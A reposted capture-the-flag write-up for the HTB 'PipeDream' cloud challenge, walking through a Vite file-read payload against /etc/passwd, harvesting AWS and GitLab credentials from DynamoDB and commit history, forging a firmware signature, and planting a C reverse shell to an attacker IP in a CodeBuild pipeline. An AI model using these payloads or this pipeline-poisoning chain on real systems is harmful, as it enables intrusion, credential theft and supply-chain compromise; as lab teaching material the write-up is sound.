# :game_die: Learning Cloud With Htb Business Ctf 2025 A Complete Cloud Writeup Part 2 End 42

> **Original Source:** [Learning Cloud With Htb Business Ctf 2025 A Complete Cloud Writeup Part 2 End 42](https://infosecwriteups.com/learning-cloud-with-htb-business-ctf-2025-a-complete-cloud-writeup-part-2-end-4274d9ea2646)
> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2025

---

## [975 points] PipeDream


>

TLDR:- AWS Key exposed in App’s Environment Variables- Credential leak from AWS DynamoDB tables- Abusing Gitlab codebuild runner to gain RCE


### Initial Look


>

This will be a pretty long journey, so grab your coffee and let’s get started.


At first, we are greeted with a self-hosted gitlab site.


We’ve tried some possible common credentials such as admin:admin, root:root, root:5iveL!fe, but nothing works. We left the gitlab and continue searching other possibilities. We tried to nmap and this is the result.


```
└─$ nmap -sV -sC -p- 18.189.24.231 -oN nmapscanx
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 15:43 UTC
Nmap scan report for gitlab.local (18.189.24.231)
Host is up (0.31s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 03:18:7f:18:28:f0:42:6e:00:7a:12:0b:14:ac:12:88 (ECDSA)
|_ 256 d5:aa:f2:b6:fc:52:29:3c:d6:62:88:c5:ff:37:0c:3e (ED25519)
443/tcp open ssl/http nginx
| ssl-cert: Subject: commonName=gitlab.local
| Subject Alternative Name: DNS:gitlab.local
| Not valid before: 2025-04-17T13:26:29
|_Not valid after: 2026-04-17T13:26:29
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
5173/tcp open unknown
| fingerprint-strings:
| DNSVersionBindReqTCP, RPCCheck:
| HTTP/1.1 400 Bad Request
| GetRequest:
| HTTP/1.1 200 OK
| Access-Control-Allow-Origin: *
| Content-Type: text/html
| Cache-Control: no-cache
| Etag: W/"2e0-2wEUhbwmUtQ0dcewCxOEDqEfO/k"
| Date: Sun, 25 May 2025 15:52:44 GMT
| Connection: close
| <!doctype html>
| <html lang="en">
| <head>
| <script type="module">
| import RefreshRuntime from "/@react-refresh"
| RefreshRuntime.injectIntoGlobalHook(window)
| window.$RefreshReg$ = () => {}
| window.$RefreshSig$ = () => (type) => type
| window.__vite_plugin_react_preamble_installed__ = true
| </script>
| <script type="module" src="/@vite/client"></script>
| <meta charset="UTF-8" />
| <meta name="viewport" content="width=device-width, initial-scale=1.0" />
| <title>Volnaya Waterplant Monitoring Dashboard</title>
| <script type="module" crossorigin src="/assets/index-DOScCniG.js"></script>
| <link rel="stylesheet" crossorigin href="/assets/index-bR_wYehe.css">
| </head>
| <body>
| HTTPOptions:
| HTTP/1.1 204 No Content
| Access-Control-Allow-Origin: *
| Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
| Vary: Access-Control-Request-Headers
| Content-Length: 0
| Date: Sun, 25 May 2025 15:52:45 GMT
| Connection: close
| RTSPRequest:
| HTTP/1.1 204 No Content
| Access-Control-Allow-Origin: *
| Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
| Vary: Access-Control-Request-Headers
| Content-Length: 0
| Date: Sun, 25 May 2025 15:52:46 GMT
|_ Connection: close
8060/tcp open http nginx 1.27.4
|_http-server-header: nginx/1.27.4
|_http-title: 404 Not Found
9094/tcp open unknown
32851/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5173-TCP:V=7.94SVN%I=7%D=5/25%Time=68333CCA%P=x86_64-pc-linux-gnu%r
[...]

```


Turns out there are other ports opened other than 22 and 443. There seems another web application running on port 5173, so let’s inspect them.


Another website that shows the water tank status. There’s also another page Firmware Update and Water Plant Settings. However, the feature doesn’t work as intended as nothing happened when you click the buttons. We can ignore these features.


Upon looking on burpsuite HTTP history, we found that the application likely run on Vite framework.


### Exploit (?)


While searching for references, we found that Vite has a recent public exploit for Arbitrary File Read vulnerability ([https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-31486/](https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-31486/)).


```
http://18.189.24.231:5173/@fs/etc/passwd?import&raw??
```


and we can just read the flag.txt


```
http://18.189.24.231:5173/@fs/flag.txt?import&raw??
```


Yay! We got the flag. However, challenge has yet to begin…


As per challenge author’s words, getting the flag by abusing the Vite vulnerability CVE-2025–31486 is the unintended solution (I submitted the flag i got with unintended way tho, because a point still a point).


So what’s the real solution? After the competition ends, I learned the intended way from author’s official [writeup](http://github.com/hackthebox/business-ctf-2025/tree/master/cloud/PipeDream). Here’s the intended solution:

### The Intended Way


Environment Variables


*src:[vite.dev](https://vite.dev)*


By the words of Vite [official documentation](https://vite.dev/guide/env-and-mode), Vite environment variables can be found on these files: `.env`, `.env.local`, `.env.production`, etc. In this case, we can find the environment variables in `.env.production`.


We get AWS creds! As usual, config the key we go.


Configure and Enumerating the creds


As usual, we used [enumerate-iam](https://github.com/andresriancho/enumerate-iam).


dynamodb:list_tables() again? Luckily we already learn how to enumerate this privilege from the previous challenge.


```
aws dynamodb list-tables --profile pipedream --region us-east-2
```


Let’s inspect `ciusers` table.


```
aws dynamodb scan --table-name ciusers --profile pipedream --region us-east-2
```


Cool! We got several potential usernames and passwords. Perhaps we can use those to log in to the Gitlab?


## Get Crisdeo Nuel Siahaan’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Back to Gitlab


Trying the creds one by one, we found that credentials siberion is valid.

>

Obtained valid creds:Username = siberion
Password = Wuj!)e9Ex’]s}Xt


Successfully logged in as siberion!


There is only one project which is created by Administrator. Let’s inspect that.


Turns out the application will redirect to internal hostname gitlab.local. To fix that, we can edit our hosts file by adding `gitlab.local` with cloud IP `18.189.24.231`:


`C:\Windows\System32\Drivers\etc\hosts` for Windows


`/etc/hosts` for Linux


Once added, refresh the page and now we can visit the project page.


Below is the content of several files:


`Makefile`


```
CC=gcc
CFLAGS=-Wall -I.

all: firmware.elf

firmware.elf: main.o water_control.o
$(CC) -o $@ $^

main.o: main.c water_control.h
$(CC) $(CFLAGS) -c main.c

water_control.o: water_control.c water_control.h
$(CC) $(CFLAGS) -c water_control.c

clean:
rm -f *.o firmware.elf
```


`.gitlab-ci.yml`


```
workflow:
rules:
- if: $CI_PIPELINE_SOURCE == "merge_request_event"
when: always
- when: never

stages:
- check
- merge

check_merge_request:
stage: check
script: |
git fetch origin $CI_MERGE_REQUEST_TARGET_BRANCH_NAME

git diff --name-status origin/$CI_MERGE_REQUEST_TARGET_BRANCH_NAME...$CI_COMMIT_SHA > changes.diff

cat changes.diff

if grep -q "^D" changes.diff; then
echo "Error: Merge Request contains deleted files. Deletions are not allowed."
exit 1
fi

if grep -q "\.gitlab-ci\.yml" changes.diff; then
echo "Error: Modifications to .gitlab-ci.yml are not allowed in this merge request."
exit 1
fi

rules:
- if: $CI_PIPELINE_SOURCE == "merge_request_event"

auto_merge:
stage: merge
script: |
curl -k --request PUT \
--header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
"https://gitlab.local/api/v4/projects/$CI_PROJECT_ID/merge_requests/$CI_MERGE_REQUEST_IID/merge?merge_when_pipeline_succeeds=true&should_remove_source_branch=true"

rules:
- if: $CI_PIPELINE_SOURCE == "merge_request_event"
```


`main.c`


```
#include "water_control.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

volatile int running = 1;

void handle_signal(int sig) {
running = 0;
}

int main() {
signal(SIGINT, handle_signal);
signal(SIGTERM, handle_signal);

printf("[Volnaya] Firmware starting...\n");
init_valves();
init_sensors();

while (running) {
read_sensors();
control_valves();
write_status_to_json();
sleep(1);
}

shutdown_valves();
shutdown_sensors();
printf("[Volnaya] Firmware shutting down.\n");
return 0;
}
```


`firmware-meta.json`


```
{
"timestamp": "2025-04-22T10:44:52Z",
"firmware_hash": "fbe11c0cd350afe4829eb21adf38fd95b062a7aa3a82062a5ddc32732d136fa7",
"signature": "cjNuS9rUzspcXhecgrWlH4geRBD/znsdgX8xRPZXevX0kHFZhr/sZWCmQHL+RBoCHQivKlbcY+nhWw0ygDLagLpiQRNSztkFNbtQSpCwsipdm+4LYg7aDmUQ+Fxv3Vlx4kgvihzi/bQfunuuJ8nQ6PWmBrGLxvA+Uly1RR+NPGN+8PlT2Rxw2Lpd6JuzDD5YLHiQGnf31W3eP2ugyocke4pGKCfc7ppVsbqjuy7XIxZ9iezDDFwR7i+Jupz1FvuQVsxeaYNfRBpDA8aGOeJkDQN8iYjV3Hkyv89Ye4G9EXefxV+ybwYeaggaIPox+lxk4jXuk5M1/E7QZc5YcAa2kg=="
}
```


There is also `buildspec.yml` file, so this challenge might be related to AWS Codebuild.

### Quick Idea


AWS Codebuild


AWS CodeBuild is a fully managed build service in the cloud. In short, you give CodeBuild your source code → it compiles, tests, packages, and produces build artifacts → done.


buildspec.yml


`buildspec.yml` is a configuration file used mainly with AWS CodeBuild. It tells CodeBuild how to build your project — basically, it's the build instructions. AWS looks at this file to figure out:


- which commands to run,

- which environment to use,

- what to do before and after the build,

- etc.


Now let’s inspect the buildspec.yml.


```
version: 0.2

env:
variables:
GITLAB_USER: "root"
GITLAB_TOKEN: "glpat-"
GITLAB_HOST: ""
secrets-manager:
DEPLOY_KEY: "volnaya/deploy-key:GITLAB_SSH_KEY"
DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"

phases:
pre_build:
commands:
- echo "Setting up Git credentials"
- git config --global credential.helper store
- echo "https://${GITLAB_USER}:${GITLAB_TOKEN}@${GITLAB_HOST}" > ~/.git-credentials
- git -c http.sslVerify=false clone https://${GITLAB_HOST}/root/volnaya-waterplant-firmware.git firmware
- echo "Verifying Signature"
- cd firmware
- FIRMWARE_META="firmware_meta.json"
- SIGNATURE_B64=$(jq -r .signature "$FIRMWARE_META")
- echo "$SIGNATURE_B64" | base64 -d > /tmp/signature.sig
- SIGNATURE_FILE="/tmp/signature.sig"
- CLEAN_META="/tmp/firmware_meta_clean.json"
- jq 'del(.signature)' "$FIRMWARE_META" > "$CLEAN_META"
- echo "$DEBUG_KEY" > /tmp/public_key.pem
- openssl dgst -sha256 -verify /tmp/public_key.pem -signature "$SIGNATURE_FILE" "$CLEAN_META" && echo "Signature verification passed." || { echo "Signature verification failed. Exiting."; exit 1; }
- ACTUAL_HASH=$(sha256sum main.c | awk '{print $1}')
- EXPECTED_HASH=$(jq -r .firmware_hash "$FIRMWARE_META")
- "$ACTUAL_HASH" == "$EXPECTED_HASH" && echo "Source hash matches signed firmware." || { echo "Hash comparision failed. Exiting."; exit 1; }
build:
commands:
- echo "Building Firmware"
- make
- mkdir -p ~/.ssh
- echo "$DEPLOY_KEY" > ~/.ssh/id_rsa
- chmod 600 ~/.ssh/id_rsa
- ssh-keyscan -H ${GITLAB_HOST} >> ~/.ssh/known_hosts
- scp firmware.elf root@${GITLAB_HOST}:/root/firmware/firmware.elf
```


Analyzing the buildspec, this is what happened:


- Setup environment variables and secrets. This shows that the application run as root.


```
env:
variables:
GITLAB_USER: "root"
GITLAB_TOKEN: "glpat-"
GITLAB_HOST: ""
secrets-manager:
DEPLOY_KEY: "volnaya/deploy-key:GITLAB_SSH_KEY"
DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
```


2. Setup Git Credentials and Cloning the repository


```
- git config --global credential.helper store
- echo "https://${GITLAB_USER}:${GITLAB_TOKEN}@${GITLAB_HOST}" > ~/.git-credentials
- git -c http.sslVerify=false clone https://${GITLAB_HOST}/root/volnaya-waterplant-firmware.git firmware
```


3. Firmware signature verification. It verify the “signature” value in firmware_meta.json


```
- cd firmware
- FIRMWARE_META="firmware_meta.json"
- SIGNATURE_B64=$(jq -r .signature "$FIRMWARE_META")
- echo "$SIGNATURE_B64" | base64 -d > /tmp/signature.sig
- jq 'del(.signature)' "$FIRMWARE_META" > "$CLEAN_META"
- echo "$DEBUG_KEY" > /tmp/public_key.pem
- openssl dgst -sha256 -verify /tmp/public_key.pem -signature "$SIGNATURE_FILE" "$CLEAN_META"
```


4. Firmware hash verification. It compares SHA256 hash of main.c with the “firmware_hash” value in firmware_meta.json


```
- ACTUAL_HASH=$(sha256sum main.c | awk '{print $1}')
- EXPECTED_HASH=$(jq -r .firmware_hash "$FIRMWARE_META")
- "$ACTUAL_HASH" == "$EXPECTED_HASH" && echo "Source hash matches signed firmware." || { echo "Hash comparision failed. Exiting."; exit 1; }
```


5. Build process


```
- echo "Building Firmware"
- make
```


6. SSH setup and deployment


```
- mkdir -p ~/.ssh
- echo "$DEPLOY_KEY" > ~/.ssh/id_rsa
- chmod 600 ~/.ssh/id_rsa
- ssh-keyscan -H ${GITLAB_HOST} >> ~/.ssh/known_hosts
- scp firmware.elf root@${GITLAB_HOST}:/root/firmware/firmware.elf
```


Since the application will be built and run, we can obtain RCE as root by modifying `main.c` into reverse shell code. However, there is a signature checking through file `firmware-meta.json `so we have to forge the signature of our modified code as well.


To achieve that, we still need 2 components:


- The privilege of building the project

- The private key used to create project’s signature


Uncovering the past


Continuing the enumeration, we can find hardcoded AWS creds and a private key from the project’s commit history.


*hardcoded AWS creds in commit fd21cc16ea6773c506fe7da5bd9d87e2c32399be*


*hardcoded private key in commit aff5a0a10fbafc1bdbf510dacc47f7d499bbc998*


Again, we configure and checked the privilege of the obtained AWS creds.


*configuring the creds*


*enumerating the key*


There exist privilege codebuild:list_projects() which are used to list all CodeBuild build projects in your AWS account.


```
aws codebuild list-projects --profile pipedream_root --region us-east-2
```


From the output above, we know that there is a project called `volnaya-firmware-build` which is likely are related to the project we saw in gitlab.


Now let’s check if this creds we are using right now have the privilege to start the build.


```

aws codebuild start-build --project-name volnaya-firmware-build \
--profile pipedream_root --region us-east-2
```


Nice… there’s no forbidden issue and the output shows the build, indicating that our account does have the privilege to start the build.

### Exploit


Now we already have the privilege to run the build and forge the signature. Let’s modify the main.c so it spawn a reverse shell.


`main.c` (NEW)


```
└─$ cat main.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
int sock;
struct sockaddr_in server;
char *ip = "X.X.X.X";
int port = 6004;
sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == -1) {
perror("socket");
exit(1);
}

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip);

if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
perror("connect");
exit(1);
}

dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);

execl("/bin/sh", "sh", NULL);

return 0;
}
```


Then we forge the signature of the code, by doing this:


- Get the SHA256sum of main.c


2. Create a new `firmware_meta.json`, put the sha256 hash in the “firmware_hash”. Remove the “signature” part.


3. Sign the new firmware_meta.json with the private key, take the base64 value of the new signature.


```
openssl dgst -sha256 -sign getpriv.pem -out signature.sig firmware_meta.json
base64 -w0 signature.sig
```


4. Add the new signature to firmware_meta.json


Now we have made modified `main.c` and `firmware_meta.json`, let’s add them to the repository. We can edit the repository through Web IDE.


Replace the content of the `main.c` and `firmware_meta.json` with our modified one. After that, commit the change.


Create merge request.


After the merge request created, it immediately merged to the main repository due to administrator have enabled the automatic merge.


We can check the main.c file in the repository again, it has modified.


Now we know that the project has been updated with our malicious code, let’s run the build. But first, we have to prepare the reverse shell listener from our VPS.


```
nc -nvlp 6004
```


Run the finishing blow.


```
aws codebuild start-build --project-name volnaya-firmware-build \
--profile pipedream_root --region us-east-2
```


Reverse shell as root will be popped up.


Now that’s real flag for us!


This challenge is really fun and creative challenge, as there are many aspects of cloud knowledge we could learn.

### Flag


>

HTB{Br34k1ng_th3_Bu1ld}

---

*Originally published on [Medium](https://infosecwriteups.com/learning-cloud-with-htb-business-ctf-2025-a-complete-cloud-writeup-part-2-end-4274d9ea2646). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
